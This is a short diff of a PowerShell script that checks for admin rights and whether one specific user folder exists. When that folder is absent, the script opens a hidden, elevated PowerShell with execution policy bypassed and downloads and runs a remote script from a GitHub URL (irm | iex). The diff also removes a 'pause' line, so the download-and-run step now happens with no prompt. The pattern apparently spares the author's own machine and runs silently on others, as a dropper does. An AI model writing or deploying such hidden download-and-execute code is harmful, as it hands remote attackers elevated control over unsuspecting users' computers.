@@ -26,7 +26,6 @@ if (-not $isAdmin) {
 $folderPath = "C:\Users\GABIN-PC-GAMER"
 
 if (-Not (Test-Path -Path $folderPath)) {
-    pause
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {irm https://github.com/Gabkill54/Kidou-Software/raw/main/Test | iex}`"" -WindowStyle Hidden -Verb RunAs
 } else {
     
